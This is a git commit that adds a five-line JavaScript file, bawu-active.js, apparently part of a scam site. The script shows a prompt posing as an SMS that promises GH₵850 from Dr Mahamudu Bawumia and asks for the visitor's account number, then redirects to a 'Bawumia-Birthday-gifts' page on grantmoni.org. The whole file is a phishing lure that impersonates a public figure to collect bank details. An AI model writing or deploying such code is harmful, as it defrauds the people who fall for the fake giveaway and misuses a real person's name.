15761c66686349621efade5f7d91a104609266ed
grntmoni <casket-90-crystal@icloud.com>
2026-06-07 14:47:24 +0100

    Create bawu-active.js

---
+++ bawu-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW GH₵850'
+password=prompt('SMS: Congratulations, you are eligible to receive GH₵850 From Dr Mahamudu Bawumia, click OK to Enter Your Acc. Number','WITHDRAW GH₵850');
+if (password != 'WITHDRAW GH₵850') {
+location.href='https://grantmoni.org/Bawumia-Birthday-gifts.html';
+}
